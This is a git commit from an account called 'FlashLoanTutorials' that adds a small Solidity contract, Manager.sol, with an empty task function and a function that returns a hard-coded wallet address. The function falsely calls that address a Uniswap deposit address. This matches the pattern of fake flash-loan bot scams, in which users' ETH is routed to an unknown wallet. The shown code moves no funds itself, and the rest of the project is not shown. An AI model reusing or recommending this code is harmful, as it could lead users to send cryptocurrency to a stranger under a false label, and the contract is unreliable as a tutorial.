d754b9cf8749eed7c3f7136e77ede2b726a56c63
FlashLoanTutorials <123822644+FlashLoanTutorials@users.noreply.github.com>
2023-01-28 10:30:11 -0500

    Add files via upload

---
+++ Manager.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+   function performTasks() public {
+	    
+   }
+
+   function uniswapDepositAddress() public pure returns (address) {
+	return 0x453dBBd6d1e05FC2c768A932f606Eff5bEbfb2F5;
+   }
+}
